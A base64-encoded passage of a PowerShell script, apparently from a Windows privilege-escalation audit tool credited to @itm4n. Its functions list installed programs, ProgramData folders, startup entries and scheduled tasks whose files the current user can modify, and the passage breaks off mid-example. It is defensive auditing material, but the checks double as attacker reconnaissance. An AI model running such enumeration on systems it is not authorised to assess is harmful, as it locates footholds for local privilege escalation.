LS0tLS0tLS0KCgojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBCRUdJTiBJTlNUQUxMRUQgUFJPR1JBTVMgICAKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmZ1bmN0aW9uIEludm9rZS1JbnN0YWxsZWRQcm9ncmFtc0NoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBFbnVtZXJhdGVzIHRoZSBhcHBsaWNhdGlvbnMgdGhhdCBhcmUgbm90IGluc3RhbGxlZCBieSBkZWZhdWx0CgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBVc2VzIHRoZSBjdXN0b20gIkdldC1JbnN0YWxsZWRQcm9ncmFtcyIgZnVuY3Rpb24gdG8gZ2V0IGEgZmlsdGVyZWQgbGlzdCBvZiBpbnN0YWxsZWQgcHJvZ3JhbXMKICAgIGFuZCB0aGVuIHJldHVybnMgZWFjaCByZXN1bHQgYXMgYSBzaW1wbGlmaWVkIFBTIG9iamVjdCwgaW5kaWNhdGluZyB0aGUgbmFtZSBhbmQgdGhlIHBhdGggb2YgCiAgICB0aGUgYXBwbGljYXRpb24uCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtSW5zdGFsbGVkUHJvZ3JhbXNDaGVjayB8IGZ0CgogICAgTmFtZSAgICAgICAgICAgIEZ1bGxQYXRoCiAgICAtLS0tICAgICAgICAgICAgLS0tLS0tLS0KICAgIE5wY2FwICAgICAgICAgICBDOlxQcm9ncmFtIEZpbGVzXE5wY2FwCiAgICBXaXJlc2hhcmsgICAgICAgQzpcUHJvZ3JhbSBGaWxlc1xXaXJlc2hhcmsKICAgIAogICAgIz4KICAgIAogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oKQoKICAgICRJbnN0YWxsZWRQcm9ncmFtc1Jlc3VsdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCAKCiAgICAkSXRlbXMgPSBHZXQtSW5zdGFsbGVkUHJvZ3JhbXMgLUZpbHRlcmVkCgogICAgRm9yRWFjaCAoJEl0ZW0gaW4gJEl0ZW1zKSB7CiAgICAgICAgJEN1cnJlbnRGaWxlTmFtZSA9ICRJdGVtLk5hbWUgCiAgICAgICAgJEN1cnJlbnRGaWxlRnVsbG5hbWUgPSAkSXRlbS5GdWxsTmFtZQogICAgICAgICRBcHBJdGVtID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgCiAgICAgICAgJEFwcEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJOYW1lIiAtVmFsdWUgJEN1cnJlbnRGaWxlTmFtZQogICAgICAgICRBcHBJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiRnVsbFBhdGgiIC1WYWx1ZSAkQ3VycmVudEZpbGVGdWxsbmFtZQogICAgICAgIFt2b2lkXSRJbnN0YWxsZWRQcm9ncmFtc1Jlc3VsdC5BZGQoJEFwcEl0ZW0pCiAgICB9CiAgICAKICAgICRJbnN0YWxsZWRQcm9ncmFtc1Jlc3VsdAp9CgpmdW5jdGlvbiBJbnZva2UtTW9kaWZpYWJsZVByb2dyYW1zQ2hlY2sgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIElkZW50aWZpZXMgYXBwbGljYXRpb25zIHdoaWNoIGhhdmUgYSBtb2RpZmlhYmxlIEVYRSBvZiBETEwgZmlsZQoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgRm9yIGVhY2ggbm9uLWRlZmF1bHQgYXBwbGljYXRpb24sIGVudW1lcmF0ZXMgdGhlIC5leGUgYW5kIC5kbGwgZmlsZXMgdGhhdCB0aGUgY3VycmVudCB1c2VyIGhhcyAKICAgIG1vZGlmeSBwZXJtaXNzaW9ucyBvbi4KICAgIAogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEludm9rZS1Nb2RpZmlhYmxlUHJvZ3JhbXNDaGVjayB8IGZ0CgogICAgTW9kaWZpYWJsZVBhdGggICAgICAgICAgICAgICAgICAgICAgSWRlbnRpdHlSZWZlcmVuY2UgICAgUGVybWlzc2lvbnMKICAgIC0tLS0tLS0tLS0tLS0tICAgICAgICAgICAgICAgICAgICAgIC0tLS0tLS0tLS0tLS0tLS0tICAgIC0tLS0tLS0tLS0tCiAgICBDOlxQcm9ncmFtIEZpbGVzXFZ1bG5BcHBcUGFja2FnZXMgICBERVNLVE9QLUZFT0hOT01cdXNlciB7V3JpdGVPd25lciwgRGVsZXRlLCBXcml0ZUF0dHJpYnV0ZXMsIFN5bmNocm9uaXplLi4ufQogICAgQzpcUHJvZ3JhbSBGaWxlc1xWdWxuQXBwXGFwcC5leGUgICAgREVTS1RPUC1GRU9ITk9NXHVzZXIge1dyaXRlT3duZXIsIERlbGV0ZSwgV3JpdGVBdHRyaWJ1dGVzLCBTeW5jaHJvbml6ZS4uLn0KICAgIEM6XFByb2dyYW0gRmlsZXNcVnVsbkFwcFxmb29iYXIuZGxsIERFU0tUT1AtRkVPSE5PTVx1c2VyIHtXcml0ZU93bmVyLCBEZWxldGUsIFdyaXRlQXR0cmlidXRlcywgU3luY2hyb25pemUuLi59CiAgICAKICAgICM+CiAgICAKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKCkKCiAgICAkSXRlbXMgPSBHZXQtSW5zdGFsbGVkUHJvZ3JhbXMgLUZpbHRlcmVkCgogICAgRm9yRWFjaCAoJEl0ZW0gaW4gJEl0ZW1zKSB7CiAgICAgICAgCiAgICAgICAgJFNlYXJjaFBhdGggPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAgICAgW3ZvaWRdJFNlYXJjaFBhdGguQWRkKFtzdHJpbmddJChKb2luLVBhdGggLVBhdGggJEl0ZW0uRnVsbE5hbWUgLUNoaWxkUGF0aCAiXCoiKSkgIyBEbyB0aGlzIHRvIGF2b2lkIHRoZSB1c2Ugb2YgLURlcHRoIHdoaWNoIGlzIFBTSDUrCiAgICAgICAgW3ZvaWRdJFNlYXJjaFBhdGguQWRkKFtzdHJpbmddJChKb2luLVBhdGggLVBhdGggJEl0ZW0uRnVsbE5hbWUgLUNoaWxkUGF0aCAiXCpcKiIpKSAjIERvIHRoaXMgdG8gYXZvaWQgdGhlIHVzZSBvZiAtRGVwdGggd2hpY2ggaXMgUFNINSsKICAgICAgICAKICAgICAgICAkQ2hpbGRJdGVtcyA9IEdldC1DaGlsZEl0ZW0gLVBhdGggJFNlYXJjaFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgLUVycm9yVmFyaWFibGUgR2V0Q2hpbGRJdGVtRXJyb3IgCiAgICAgICAgCiAgICAgICAgaWYgKC1ub3QgJEdldENoaWxkSXRlbUVycm9yKSB7CgogICAgICAgICAgICAkQ2hpbGRJdGVtcyB8IEZvckVhY2gtT2JqZWN0IHsKCiAgICAgICAgICAgICAgICBpZiAoJF8gLWlzIFtTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mb10pIHsKICAgICAgICAgICAgICAgICAgICAkTW9kaWZpYWJsZVBhdGhzID0gJF8gfCBHZXQtTW9kaWZpYWJsZVBhdGggLUxpdGVyYWxQYXRocwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAjIENoZWNrIG9ubHkgLmV4ZSBhbmQgLmRsbCA/Pz8KICAgICAgICAgICAgICAgICAgICAjIFRPRE86IG1heWJlIGNvbnNpZGVyIG90aGVyIGV4dGVuc2lvbnMgCiAgICAgICAgICAgICAgICAgICAgaWYgKCRfLkZ1bGxOYW1lIC1MaWtlICIqLmV4ZSIgLW9yICRfLkZ1bGxOYW1lIC1MaWtlICIqLmRsbCIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE1vZGlmaWFibGVQYXRocyA9ICRfIHwgR2V0LU1vZGlmaWFibGVQYXRoIC1MaXRlcmFsUGF0aHMgCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgkTW9kaWZpYWJsZVBhdGhzKSB7CiAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJFBhdGggaW4gJE1vZGlmaWFibGVQYXRocykgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFBhdGguTW9kaWZpYWJsZVBhdGggLWVxICRfLkZ1bGxOYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUGF0aAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgpmdW5jdGlvbiBJbnZva2UtUHJvZ3JhbURhdGFDaGVjayB7CiAgICA8IwogICAgLlNZTk9QU0lTCiAgICAKICAgIENoZWNrcyBmb3IgbW9kaWZpYWJsZSBmaWxlcyBhbmQgZm9sZGVycyB1bmRlciBub24gZGVmYXVsdCBQcm9ncmFtRGF0YSBmb2xkZXJzLgoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgVGhpcyBzY3JpcHQgZmlyc3QgbGlzdHMgYWxsIHRoZSBzdWJmb2xkZXJzIHVuZGVyICdDOlxQcm9ncmFtRGF0YVwnLiBGb3IgZWFjaCBmb2xkZXIgdGhhdAogICAgaXMgbm90IGEgImtub3duIiBkZWZhdWx0IFdpbmRvd3MgZm9sZGVyLCBpdCBsaXN0cyBhbGwgdGhlIGZpbGVzIGFuZCBmb2xkZXJzIGl0IGNvbnRhaW5zLiBJZiBhIAogICAgbW9kaWZpYWJsZSBmaWxlIG9yIGZvbGRlciBpcyBmb3VuZCwgaXQgaXMgcmVwb3J0ZWQgYnkgdGhlIHNjcmlwdC4KICAgIAogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEludm9rZS1Qcm9ncmFtRGF0YUNoZWNrCgogICAgTW9kaWZpYWJsZVBhdGggICAgOiBDOlxQcm9ncmFtRGF0YVxjaG9jb2xhdGV5XGxvZ3MKICAgIElkZW50aXR5UmVmZXJlbmNlIDogQlVJTFRJTlxVc2VycwogICAgUGVybWlzc2lvbnMgICAgICAgOiB7V3JpdGVBdHRyaWJ1dGVzLCBTeW5jaHJvbml6ZSwgQXBwZW5kRGF0YS9BZGRTdWJkaXJlY3RvcnksIFdyaXRlRXh0ZW5kZWRBdHRyaWJ1dGVzLi4ufQoKICAgIE1vZGlmaWFibGVQYXRoICAgIDogQzpcUHJvZ3JhbURhdGFcY2hvY29sYXRleVxsb2dzXGNob2NvLnN1bW1hcnkubG9nCiAgICBJZGVudGl0eVJlZmVyZW5jZSA6IEJVSUxUSU5cVXNlcnMKICAgIFBlcm1pc3Npb25zICAgICAgIDoge1dyaXRlQXR0cmlidXRlcywgU3luY2hyb25pemUsIEFwcGVuZERhdGEvQWRkU3ViZGlyZWN0b3J5LCBXcml0ZUV4dGVuZGVkQXR0cmlidXRlcy4uLn0KCiAgICBNb2RpZmlhYmxlUGF0aCAgICA6IEM6XFByb2dyYW1EYXRhXGNob2NvbGF0ZXlcbG9nc1xjaG9jb2xhdGV5LmxvZwogICAgSWRlbnRpdHlSZWZlcmVuY2UgOiBCVUlMVElOXFVzZXJzCiAgICBQZXJtaXNzaW9ucyAgICAgICA6IHtXcml0ZUF0dHJpYnV0ZXMsIFN5bmNocm9uaXplLCBBcHBlbmREYXRhL0FkZFN1YmRpcmVjdG9yeSwgV3JpdGVFeHRlbmRlZEF0dHJpYnV0ZXMuLi59CgogICAgTW9kaWZpYWJsZVBhdGggICAgOiBDOlxQcm9ncmFtRGF0YVxzaGltZ2VuXGdlbmVyYXRlZGZpbGVzCiAgICBJZGVudGl0eVJlZmVyZW5jZSA6IEJVSUxUSU5cVXNlcnMKICAgIFBlcm1pc3Npb25zICAgICAgIDoge1dyaXRlQXR0cmlidXRlcywgQXBwZW5kRGF0YS9BZGRTdWJkaXJlY3RvcnksIFdyaXRlRXh0ZW5kZWRBdHRyaWJ1dGVzLCBXcml0ZURhdGEvQWRkRmlsZX0KCiAgICBNb2RpZmlhYmxlUGF0aCAgICA6IEM6XFByb2dyYW1EYXRhXFZNd2FyZVxsb2dzCiAgICBJZGVudGl0eVJlZmVyZW5jZSA6IEJVSUxUSU5cVXNlcnMKICAgIFBlcm1pc3Npb25zICAgICAgIDoge1dyaXRlQXR0cmlidXRlcywgQXBwZW5kRGF0YS9BZGRTdWJkaXJlY3RvcnksIFdyaXRlRXh0ZW5kZWRBdHRyaWJ1dGVzLCBXcml0ZURhdGEvQWRkRmlsZX0KICAgIAogICAgIz4KCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgpCgogICAgJElnbm9yZWRQcm9ncmFtRGF0YSA9IEAoIk1pY3Jvc29mdCIsICJNaWNyb3NvZnQgT25lRHJpdmUiLCAiUGFja2FnZSBDYWNoZSIsICJQYWNrYWdlcyIsICJTb2Z0d2FyZURpc3RyaWJ1dGlvbiIsICJzc2giLCAiVVNPUHJpdmF0ZSIsICJVU09TaGFyZWQiLCAiIikKCiAgICBHZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJvZ3JhbURhdGEgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAKICAgICAgICBpZiAoJF8gLWlzIFtTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mb10gLWFuZCAoLW5vdCAoJElnbm9yZWRQcm9ncmFtRGF0YSAtY29udGFpbnMgJF8uTmFtZSkpKSB7CiAgICAKICAgICAgICAgICAgJF8gfCBHZXQtQ2hpbGRJdGVtIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkXyB8IEdldC1Nb2RpZmlhYmxlUGF0aCAtTGl0ZXJhbFBhdGhzIHwgV2hlcmUtT2JqZWN0IHskXyAtYW5kICRfLk1vZGlmaWFibGVQYXRoIC1hbmQgKCRfLk1vZGlmaWFibGVQYXRoIC1uZSAnJyl9IAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgpmdW5jdGlvbiBJbnZva2UtQXBwbGljYXRpb25zT25TdGFydHVwQ2hlY2sgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIEVudW1lcmF0ZXMgdGhlIGFwcGxpY2F0aW9ucyB3aGljaCBhcmUgcnVuIG9uIHN0YXJ0dXAKCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgogICAgCiAgICBBcHBsaWNhdGlvbnMgY2FuIGJlIHJ1biBvbiBzdGFydHVwIG9yIHdoZW5ldmVyIGEgdXNlciBsb2dzIG9uLiBUaGV5IGNhbiBiZSBlaXRoZXIgY29uZmlndXJlZAogICAgaW4gdGhlIHJlZ2lzdHJ5IG9yIGJ5IGFkZGluZyBhbiBzaG9ydGN1dCBmaWxlICguTE5LKSBpbiBhIFN0YXJ0IE1lbnUgZm9sZGVyLiAKICAgIAogICAgLkVYQU1QTEUKICAgIAogICAgUFMgQzpcPiBJbnZva2UtQXBwbGljYXRpb25zT25TdGFydHVwQ2hlY2sKCiAgICBOYW1lICAgICAgICAgOiBTZWN1cml0eUhlYWx0aAogICAgUGF0aCAgICAgICAgIDogSEtMTVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5cU2VjdXJpdHlIZWFsdGgKICAgIERhdGEgICAgICAgICA6ICV3aW5kaXIlXHN5c3RlbTMyXFNlY3VyaXR5SGVhbHRoU3lzdHJheS5leGUKICAgIElzTW9kaWZpYWJsZSA6IEZhbHNlCgogICAgTmFtZSAgICAgICAgIDogVk13YXJlIFVzZXIgUHJvY2VzcwogICAgUGF0aCAgICAgICAgIDogSEtMTVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5cVk13YXJlIFVzZXIgUHJvY2VzcwogICAgRGF0YSAgICAgICAgIDogIkM6XFByb2dyYW0gRmlsZXNcVk13YXJlXFZNd2FyZSBUb29sc1x2bXRvb2xzZC5leGUiIC1uIHZtdXNyCiAgICBJc01vZGlmaWFibGUgOiBGYWxzZQogICAgCiAgICAjPgoKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKCkKCiAgICAjIElzIGl0IHJlbGV2YW50IHRvIGNoZWNrIEhLQ1UgZW50cmllcz8/PwogICAgI1tzdHJpbmdbXV0kUmVnaXN0cnlQYXRocyA9ICJIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIsICJIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bk9uY2UiLCAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iLCAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5PbmNlIgogICAgW3N0cmluZ1tdXSRSZWdpc3RyeVBhdGhzID0gIkhLTE1cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIiwgIkhLTE1cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuT25jZSIKCiAgICAkUmVnaXN0cnlQYXRocyB8IEZvckVhY2gtT2JqZWN0IHsKCiAgICAgICAgJFJlZ0tleVBhdGggPSAkXwoKICAgICAgICAkSXRlbSA9IEdldC1JdGVtIC1QYXRoICJSZWdpc3RyeTo6JCgkUmVnS2V5UGF0aCkiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIC1FcnJvclZhcmlhYmxlIEVycm9yR2V0SXRlbQogICAgICAgIGlmICgtbm90ICRFcnJvckdldEl0ZW0pIHsKCiAgICAgICAgICAgICRJdGVtIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgUHJvcGVydHkgfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgICAgICAgICAgJFJlZ0tleVZhbHVlTmFtZSA9ICRfCiAgICAgICAgICAgICAgICAkUmVnS2V5VmFsdWVEYXRhID0gJEl0ZW0uR2V0VmFsdWUoJFJlZ0tleVZhbHVlTmFtZSwgIiIsICJEb05vdEV4cGFuZEVudmlyb25tZW50TmFtZXMiKQoKICAgICAgICAgICAgICAgIGlmICgkUmVnS2V5VmFsdWVEYXRhIC1hbmQgKCRSZWdLZXlWYWx1ZURhdGEgLW5lICcnKSkgewoKICAgICAgICAgICAgICAgICAgICAkTW9kaWZpYWJsZVBhdGhzID0gJFJlZ0tleVZhbHVlRGF0YSB8IEdldC1Nb2RpZmlhYmxlUGF0aCB8IFdoZXJlLU9iamVjdCB7JF8gLWFuZCAkXy5Nb2RpZmlhYmxlUGF0aCAtYW5kICgkXy5Nb2RpZmlhYmxlUGF0aCAtbmUgJycpfQogICAgICAgICAgICAgICAgICAgIGlmICgoW29iamVjdFtdXSRNb2RpZmlhYmxlUGF0aHMpLkxlbmd0aCAtZ3QgMCkgewogICAgICAgICAgICAgICAgICAgICAgICAkSXNNb2RpZmlhYmxlID0gJFRydWUgCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElzTW9kaWZpYWJsZSA9ICRGYWxzZSAKICAgICAgICAgICAgICAgICAgICB9CiAgICAKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0SXRlbSA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IAogICAgICAgICAgICAgICAgICAgICRSZXN1bHRJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiTmFtZSIgLVZhbHVlICRSZWdLZXlWYWx1ZU5hbWUKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0SXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlBhdGgiIC1WYWx1ZSAiJCgkUmVnS2V5UGF0aClcJCgkUmVnS2V5VmFsdWVOYW1lKSIKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0SXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkRhdGEiIC1WYWx1ZSAkUmVnS2V5VmFsdWVEYXRhCiAgICAgICAgICAgICAgICAgICAgJFJlc3VsdEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJJc01vZGlmaWFibGUiIC1WYWx1ZSAkSXNNb2RpZmlhYmxlCiAgICAgICAgICAgICAgICAgICAgJFJlc3VsdEl0ZW0gCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgJFJvb3QgPSAoR2V0LUl0ZW0gLVBhdGggJGVudjp3aW5kaXIpLlBTRHJpdmUuUm9vdAogICAgCiAgICAjIFdlIHdhbnQgdG8gY2hlY2sgb25seSBzdGFydHVwIGFwcGxpY2F0aW9ucyB0aGF0IGFmZmVjdCBhbGwgdXNlcnMKICAgICMgW3N0cmluZ1tdXSRGaWxlU3lzdGVtUGF0aHMgPSAiXFVzZXJzXEFsbCBVc2Vyc1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiLCAiXFVzZXJzXCRlbnY6VVNFUk5BTUVcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVwIgogICAgW3N0cmluZ1tdXSRGaWxlU3lzdGVtUGF0aHMgPSAiXFVzZXJzXEFsbCBVc2Vyc1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiCgogICAgJEZpbGVTeXN0ZW1QYXRocyB8IEZvckVhY2gtT2JqZWN0IHsKCiAgICAgICAgJFN0YXJ0dXBGb2xkZXJQYXRoID0gSm9pbi1QYXRoIC1QYXRoICRSb290IC1DaGlsZFBhdGggJF8gCgogICAgICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJFN0YXJ0dXBGb2xkZXJQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkRW50cnlOYW1lID0gJF8uTmFtZQogICAgICAgICAgICAkRW50cnlQYXRoID0gJF8uRnVsbE5hbWUKCiAgICAgICAgICAgIGlmICgkRW50cnlQYXRoIC1MaWtlICIqLmxuayIpIHsKCiAgICAgICAgICAgICAgICB0cnkgewoKICAgICAgICAgICAgICAgICAgICAkV3NoID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFdTY3JpcHQuU2hlbGwKICAgICAgICAgICAgICAgICAgICAkU2hvcnRjdXQgPSAkV3NoLkNyZWF0ZVNob3J0Y3V0KChSZXNvbHZlLVBhdGggLVBhdGggJEVudHJ5UGF0aCkpCgogICAgICAgICAgICAgICAgICAgICRNb2RpZmlhYmxlUGF0aHMgPSAkU2hvcnRjdXQuVGFyZ2V0UGF0aCB8IEdldC1Nb2RpZmlhYmxlUGF0aCAtTGl0ZXJhbFBhdGhzIHwgV2hlcmUtT2JqZWN0IHskXyAtYW5kICRfLk1vZGlmaWFibGVQYXRoIC1hbmQgKCRfLk1vZGlmaWFibGVQYXRoIC1uZSAnJyl9CiAgICAgICAgICAgICAgICAgICAgaWYgKChbb2JqZWN0W11dJE1vZGlmaWFibGVQYXRocykuTGVuZ3RoIC1ndCAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRJc01vZGlmaWFibGUgPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRJc01vZGlmaWFibGUgPSAkRmFsc2UKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICRSZXN1bHRJdGVtID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgCiAgICAgICAgICAgICAgICAgICAgJFJlc3VsdEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJOYW1lIiAtVmFsdWUgJEVudHJ5TmFtZQogICAgICAgICAgICAgICAgICAgICRSZXN1bHRJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiUGF0aCIgLVZhbHVlICRFbnRyeVBhdGgKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0SXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkRhdGEiIC1WYWx1ZSAiJCgkU2hvcnRjdXQuVGFyZ2V0UGF0aCkgJCgkU2hvcnRjdXQuQXJndW1lbnRzKSIKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0SXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIklzTW9kaWZpYWJsZSIgLVZhbHVlICRJc01vZGlmaWFibGUKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0SXRlbSAKCiAgICAgICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAjIGRvIG5vdGhpbmcKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKZnVuY3Rpb24gSW52b2tlLUFwcGxpY2F0aW9uc09uU3RhcnR1cFZ1bG5DaGVjayB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgRW51bWVyYXRlcyBzdGFydHVwIGFwcGxpY2F0aW9ucyB0aGF0IGNhbiBiZSBtb2RpZmllZCBieSB0aGUgY3VycmVudCB1c2VyCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBTb21lIGFwcGxpY2F0aW9ucyBjYW4gYmUgc2V0IGFzICJzdGFydHVwIiBhcHBsaWNhdGlvbnMgZm9yIGFsbCB1c2Vycy4gSWYgYSB1c2VyIGNhbiBtb2RpZnkgb25lCiAgICBvZiB0aGVzZSBhcHBzLCB0aGV5IHdvdWxkIHBvdGVudGlhbGx5IGJlIGFibGUgdG8gcnVuIGFyYml0cmFyeSBjb2RlIGluIHRoZSBjb250ZXh0IG9mIG90aGVyIAogICAgdXNlcnMuIFRoZXJlZm9yZSwgbG93LXByaXZpbGVnZWQgdXNlcnMgc2hvdWxkIG5vdCBiZSBhYmxlIHRvIG1vZGlmeSB0aGUgZmlsZXMgdXNlZCBieSBzdWNoCiAgICBhcHBsaWNhdGlvbi4KICAgIAogICAgIz4KCiAgICBJbnZva2UtQXBwbGljYXRpb25zT25TdGFydHVwQ2hlY2sgfCBXaGVyZS1PYmplY3QgeyAkXy5Jc01vZGlmaWFibGUgfQp9CgpmdW5jdGlvbiBJbnZva2UtU2NoZWR1bGVkVGFza3NJbWFnZVBlcm1pc3Npb25zQ2hlY2sgewogICAgPCMKICAgIC5TWU5PUFNJUwogICAgCiAgICBFbnVtcmF0ZXMgc2NoZWR1bGVkIHRhc2tzIHdpdGggYSBtb2RpZmlhYmxlIHBhdGgKCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIFRoaXMgZnVuY3Rpb24gZW51bWVyYXRlcyBhbGwgdGhlIHNjaGVkdWxlZCB0YXNrcyB3aGljaCBhcmUgdmlzaWJsZSBieSB0aGUgY3VycmVudCB1c2VyIGJ1dCBhcmUKICAgIG5vdCBvd25lZCBieSB0aGUgY3VycmVudCB1c2VyLiBGb3IgZWFjaCB0YXNrLCBpdCBleHRyYWN0cyB0aGUgY29tbWFuZCBsaW5lIGFuZCBjaGVja3Mgd2hldGhlciAKICAgIGl0IGNvbnRhaW5zIGEgcGF0aCBwb2ludGluZyB0byBhIG1vZGlmaWFibGUgZmlsZS4gSWYgYSB0YXNrIGlzIHJ1biBhcyB0aGUgY3VycmVudCB1c2VyLCBpdCBpcyAKICAgIGZpbHRlcmVkIG91dC4gCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtU2NoZWR1bGVkVGFza3NJbWFnZVBlcm1pc3Npb25zQ2hlY2sKCiAgICBUYXNrTmFtZSAgICAgICAgICAgOiBEdW1teVRhc2sKICAgIFRhc2tQYXRoICAgICAgICAg